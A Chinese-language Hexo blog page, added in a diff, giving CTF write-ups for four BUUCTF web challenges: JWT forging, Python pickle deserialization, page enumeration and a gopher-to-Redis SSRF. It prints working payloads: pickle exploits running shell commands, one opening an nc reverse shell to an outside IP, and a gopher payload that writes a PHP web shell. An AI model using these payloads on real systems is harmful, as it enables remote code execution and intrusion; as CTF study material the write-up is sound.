@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="一个彩笔">
+  <meta name="author" content="dWm2">
+  <meta name="keywords" content="dWm2">
+  <title>BUUCTF WEB wp2 ~ dWm2&#39;s Blog</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>dWm2's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/2.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Thursday, January 7th 2021, 12:00 am
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    1.1k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      5 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="fas fa-angle-down scroll-down-arrow"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p><strong>考点：JWT伪造，PYTHON反序列化</strong></p>
+<p>点进来是个商店，看这意思是要买lv6的东西。翻了几页找不到lv6。</p>
+<p>那写个脚本找找Lv6。</p>
+<p>除此之外还有登录注册。随便注册一个用户进来，余额1000。<img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221151101173.png" srcset="/img/loading.gif" alt="image-20201221151101173"></p>
+<p>跑着脚本的期间看看购买的包。两个值得注意的点，一个是JWT,那就意味着可能可以通过伪造JWT登入管理员用户。另一个是传参中的price和discount,可以尝试是否可以通过更改他们改变价格。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221150055193.png" srcset="/img/loading.gif" alt="image-20201221150055193"></p>
+<p>这时候脚本也跑出来了，在181页。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221150022912.png" srcset="/img/loading.gif" alt="image-20201221150022912"></p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221150342904.png" srcset="/img/loading.gif" alt="image-20201221150342904"></p>
+<p>抓这个的包，尝试后发现改discount可行。得到新页面/b1g_m4mber</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221151339495.png" srcset="/img/loading.gif" alt="image-20201221151339495"></p>
+<p>访问，要求admin权限。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221151640156.png" srcset="/img/loading.gif" alt="image-20201221151640156"></p>
+<p>那就正好jwt改改。</p>
+<p>爆一下密码1Kun。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221153737776.png" srcset="/img/loading.gif" alt="image-20201221153737776"></p>
+<p>得到新的JWT。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154046663.png" srcset="/img/loading.gif" alt="image-20201221154046663"></p>
+<p>传入JWT进来了。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154350466.png" srcset="/img/loading.gif" alt="image-20201221154350466"></p>
+<p>进个人中心得到新hint。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154538548.png" srcset="/img/loading.gif" alt="image-20201221154538548"></p>
+<p>解码，说是有后门。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154527108.png" srcset="/img/loading.gif" alt="image-20201221154527108"></p>
+<p>点点成为大会员，抓个包。程序员跑路前留下了源码。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20201221154901468.png" srcset="/img/loading.gif" alt="image-20201221154901468"></p>
+<p>翻翻源码，在Admin.py里发现了序列化</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>
+        p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>
+<p>exp</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> urllib
+
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('ls /').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag.txt').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token keyword">print</span> a
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+payload <span class="token operator">=</span> c__builtin__<span class="token operator">%</span>0Aeval<span class="token operator">%</span>0Ap0<span class="token operator">%</span><span class="token number">0A</span><span class="token operator">%</span>28S<span class="token operator">%</span>22__import__<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27os<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>popen<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27ls<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>read<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>0Ap1<span class="token operator">%</span>0Atp2<span class="token operator">%</span>0ARp3<span class="token operator">%</span><span class="token number">0A</span><span class="token punctuation">.</span>
+payload <span class="token operator">=</span> c__builtin__<span class="token operator">%</span>0Aeval<span class="token operator">%</span>0Ap0<span class="token operator">%</span><span class="token number">0A</span><span class="token operator">%</span>28S<span class="token operator">%</span>22__import__<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27os<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>popen<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>read<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>0Ap1<span class="token operator">%</span>0Atp2<span class="token operator">%</span>0ARp3<span class="token operator">%</span><span class="token number">0A</span><span class="token punctuation">.</span></code></pre>
+<p>向become传入payload,得到flag。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210105183423284.png" srcset="/img/loading.gif" alt="image-20210105183423284"></p>
+<h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h1><p><strong>考点：python反序列化</strong></p>
+<p>题目就告诉是pickle了。</p>
+<p>进来是一个商店，还是熟悉的钱不够买东西环节。</p>
+<p>抓个包看一下。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210105184925755.png" srcset="/img/loading.gif" alt="image-20210105184925755"></p>
+<p>解一下这里的session，本来想着看能不能改下money，但可以看到这里的anit_tamper_hmac就是为了防止数据被篡改。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210105210545805.png" srcset="/img/loading.gif" alt="image-20210105210545805"></p>
+<p>再加上没有源码，这里直接选择利用python反序列化反弹shell。</p>
+<p>exp</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64
+<span class="token keyword">import</span> pickle
+
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').system('nc 172.16.188.63 2333 -e/bin/sh')"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>得到payload</p>
+<pre><code>Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMiX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3Mi4xNi4xODguNjMgMjMzMyAtZS9iaW4vc2gnKSIKcDEKdHAyClJwMwou</code></pre><p>payload传入session</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107185939246.png" srcset="/img/loading.gif" alt="image-20210107185939246"></p>
+<p>直接cat flag</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107190002376.png" srcset="/img/loading.gif" alt="image-20210107190002376"></p>
+<h1 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h1><p>进来看见这个贴图，说自己是元素大师，一共有118种元素。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107191830284.png" srcset="/img/loading.gif" alt="image-20210107191830284"></p>
+<p>百度了一下，原来是化学元素。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107192055689.png" srcset="/img/loading.gif" alt="image-20210107192055689"></p>
+<p>查看源码，发现两个十六进制字符串。转一下是Po和.php。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107192149655.png" srcset="/img/loading.gif" alt="image-20210107192149655"></p>
+<p>访问一下，内容却只有一个.</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107192507699.png" srcset="/img/loading.gif" alt="image-20210107192507699"></p>
+<p>先试试其他元素的页面有没有回显。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107194107338.png" srcset="/img/loading.gif" alt="image-20210107194107338"></p>
+<p>确实是有的，那把这些页面的回显拼起来就可以了。</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url<span class="token operator">=</span><span class="token string">'http://acc3a451-dabc-4062-ac0a-b261302de6ac.node3.buuoj.cn/'</span>
+flag<span class="token operator">=</span><span class="token string">''</span>
+dict1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'He'</span><span class="token punctuation">,</span> <span class="token string">'Li'</span><span class="token punctuation">,</span> <span class="token string">'Be'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'Ne'</span><span class="token punctuation">,</span> <span class="token string">'Na'</span><span class="token punctuation">,</span> <span class="token string">'Mg'</span><span class="token punctuation">,</span> <span class="token string">'Al'</span><span class="token punctuation">,</span> <span class="token string">'Si'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'Cl'</span><span class="token punctuation">,</span> <span class="token string">'Ar'</span><span class="token punctuation">,</span>
+        <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'Ca'</span><span class="token punctuation">,</span> <span class="token string">'Sc'</span><span class="token punctuation">,</span> <span class="token string">'Ti'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'Cr'</span><span class="token punctuation">,</span> <span class="token string">'Mn'</span><span class="token punctuation">,</span> <span class="token string">'Fe'</span><span class="token punctuation">,</span> <span class="token string">'Co'</span><span class="token punctuation">,</span> <span class="token string">'Ni'</span><span class="token punctuation">,</span> <span class="token string">'Cu'</span><span class="token punctuation">,</span> <span class="token string">'Zn'</span><span class="token punctuation">,</span> <span class="token string">'Ga'</span><span class="token punctuation">,</span> <span class="token string">'Ge'</span><span class="token punctuation">,</span> <span class="token string">'As'</span><span class="token punctuation">,</span> <span class="token string">'Se'</span><span class="token punctuation">,</span> <span class="token string">'Br'</span><span class="token punctuation">,</span>
+        <span class="token string">'Kr'</span><span class="token punctuation">,</span> <span class="token string">'Rb'</span><span class="token punctuation">,</span> <span class="token string">'Sr'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'Zr'</span><span class="token punctuation">,</span> <span class="token string">'Nb'</span><span class="token punctuation">,</span> <span class="token string">'Mo'</span><span class="token punctuation">,</span> <span class="token string">'Te'</span><span class="token punctuation">,</span> <span class="token string">'Ru'</span><span class="token punctuation">,</span> <span class="token string">'Rh'</span><span class="token punctuation">,</span> <span class="token string">'Pd'</span><span class="token punctuation">,</span> <span class="token string">'Ag'</span><span class="token punctuation">,</span> <span class="token string">'Cd'</span><span class="token punctuation">,</span> <span class="token string">'In'</span><span class="token punctuation">,</span> <span class="token string">'Sn'</span><span class="token punctuation">,</span> <span class="token string">'Sb'</span><span class="token punctuation">,</span> <span class="token string">'Te'</span><span class="token punctuation">,</span>
+        <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'Xe'</span><span class="token punctuation">,</span> <span class="token string">'Cs'</span><span class="token punctuation">,</span> <span class="token string">'Ba'</span><span class="token punctuation">,</span> <span class="token string">'La'</span><span class="token punctuation">,</span> <span class="token string">'Ce'</span><span class="token punctuation">,</span> <span class="token string">'Pr'</span><span class="token punctuation">,</span> <span class="token string">'Nd'</span><span class="token punctuation">,</span> <span class="token string">'Pm'</span><span class="token punctuation">,</span> <span class="token string">'Sm'</span><span class="token punctuation">,</span> <span class="token string">'Eu'</span><span class="token punctuation">,</span> <span class="token string">'Gd'</span><span class="token punctuation">,</span> <span class="token string">'Tb'</span><span class="token punctuation">,</span> <span class="token string">'Dy'</span><span class="token punctuation">,</span> <span class="token string">'Ho'</span><span class="token punctuation">,</span> <span class="token string">'Er'</span><span class="token punctuation">,</span> <span class="token string">'Tm'</span><span class="token punctuation">,</span>
+        <span class="token string">'Yb'</span><span class="token punctuation">,</span> <span class="token string">'Lu'</span><span class="token punctuation">,</span> <span class="token string">'Hf'</span><span class="token punctuation">,</span> <span class="token string">'Ta'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'Re'</span><span class="token punctuation">,</span> <span class="token string">'Os'</span><span class="token punctuation">,</span> <span class="token string">'Ir'</span><span class="token punctuation">,</span> <span class="token string">'Pt'</span><span class="token punctuation">,</span> <span class="token string">'Au'</span><span class="token punctuation">,</span> <span class="token string">'Hg'</span><span class="token punctuation">,</span> <span class="token string">'Tl'</span><span class="token punctuation">,</span> <span class="token string">'Pb'</span><span class="token punctuation">,</span> <span class="token string">'Bi'</span><span class="token punctuation">,</span> <span class="token string">'Po'</span><span class="token punctuation">,</span> <span class="token string">'At'</span><span class="token punctuation">,</span> <span class="token string">'Rn'</span><span class="token punctuation">,</span>
+        <span class="token string">'Fr'</span><span class="token punctuation">,</span> <span class="token string">'Ra'</span><span class="token punctuation">,</span> <span class="token string">'Ac'</span><span class="token punctuation">,</span> <span class="token string">'Th'</span><span class="token punctuation">,</span> <span class="token string">'Pa'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'Np'</span><span class="token punctuation">,</span> <span class="token string">'Pu'</span><span class="token punctuation">,</span> <span class="token string">'Am'</span><span class="token punctuation">,</span> <span class="token string">'Cm'</span><span class="token punctuation">,</span> <span class="token string">'Bk'</span><span class="token punctuation">,</span> <span class="token string">'Cf'</span><span class="token punctuation">,</span> <span class="token string">'Es'</span><span class="token punctuation">,</span> <span class="token string">'Fm'</span><span class="token punctuation">,</span><span class="token string">'Md'</span><span class="token punctuation">,</span> <span class="token string">'No'</span><span class="token punctuation">,</span> <span class="token string">'Lr'</span><span class="token punctuation">,</span>
+        <span class="token string">'Rf'</span><span class="token punctuation">,</span> <span class="token string">'Db'</span><span class="token punctuation">,</span> <span class="token string">'Sg'</span><span class="token punctuation">,</span> <span class="token string">'Bh'</span><span class="token punctuation">,</span> <span class="token string">'Hs'</span><span class="token punctuation">,</span> <span class="token string">'Mt'</span><span class="token punctuation">,</span> <span class="token string">'Ds'</span><span class="token punctuation">,</span> <span class="token string">'Rg'</span><span class="token punctuation">,</span> <span class="token string">'Cn'</span><span class="token punctuation">,</span> <span class="token string">'Nh'</span><span class="token punctuation">,</span> <span class="token string">'Fl'</span><span class="token punctuation">,</span> <span class="token string">'Mc'</span><span class="token punctuation">,</span> <span class="token string">'Lv'</span><span class="token punctuation">,</span> <span class="token string">'Ts'</span><span class="token punctuation">,</span> <span class="token string">'Og'</span><span class="token punctuation">,</span> <span class="token string">'Uue'</span><span class="token punctuation">]</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> dict1<span class="token punctuation">:</span>
+    urls<span class="token operator">=</span>url <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'.php'</span>
+    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span>r<span class="token punctuation">.</span>text
+        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>
+<p>得到页面。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107195612739.png" srcset="/img/loading.gif" alt="image-20210107195612739"></p>
+<p>访问得flag。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107195633082.png" srcset="/img/loading.gif" alt="image-20210107195633082"></p>
+<h1 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h1><p><strong>考点：gopher攻击redis</strong></p>
+<p>进来是一个可以输url的界面，参数是url和submit，功能就是跳转页面。先尝试一下127.0.0.1，回显别这样，应该是存在过滤。考虑是否存在ssrf。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107220746121.png" srcset="/img/loading.gif" alt="image-20210107220746121"></p>
+<p>查看源码发现hint。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107222928870.png" srcset="/img/loading.gif" alt="image-20210107222928870"></p>
+<p>访问一下。泄露了网卡信息。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108131829495.png" srcset="/img/loading.gif" alt="image-20210108131829495"></p>
+<p>读下index.php的源码，测试中发现file被过滤，用file:/ 绕过。</p>
+<pre><code>file: /var/www/html/index.php</code></pre><p>源码如下,过滤了file,dict,127.0.0.1和localhost。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210107233058451.png" srcset="/img/loading.gif" alt="image-20210107233058451"></p>
+<p>扫一下内网存活主机。</p>
+<p>这个主机给了个提示。说是端口有问题。那就接着扫下端口。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108144326454.png" srcset="/img/loading.gif" alt="image-20210108144326454"></p>
+<p>扫到6379，redis端口。用Gopherus生成payload。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108161614967.png" srcset="/img/loading.gif" alt="image-20210108161614967"></p>
+<p>传payload</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108161652804.png" srcset="/img/loading.gif" alt="image-20210108161652804"></p>
+<p>访问shell.php,有回显了。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108161741846.png" srcset="/img/loading.gif" alt="image-20210108161741846"></p>
+<p>然后直接用ls /,和cat /flag得到flag。</p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108161958901.png" srcset="/img/loading.gif" alt="image-20210108161958901"></p>
+<p>payload</p>
+<pre><code>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2438%0D%0A%0A%0A%3C%3Fphp%20echo%20system%28%27cat%20/flag%27%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108162207627.png" srcset="/img/loading.gif" alt="image-20210108162207627"></p>
+<p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210109175958037.png" srcset="/img/loading.gif" alt="image-20210109175958037"></p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+              <span>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/ctfweb">ctfweb</a>
+                  &nbsp;
+                
+              </span>&nbsp;&nbsp;
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/BUUCTF">BUUCTF</a>
+                
+                  <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
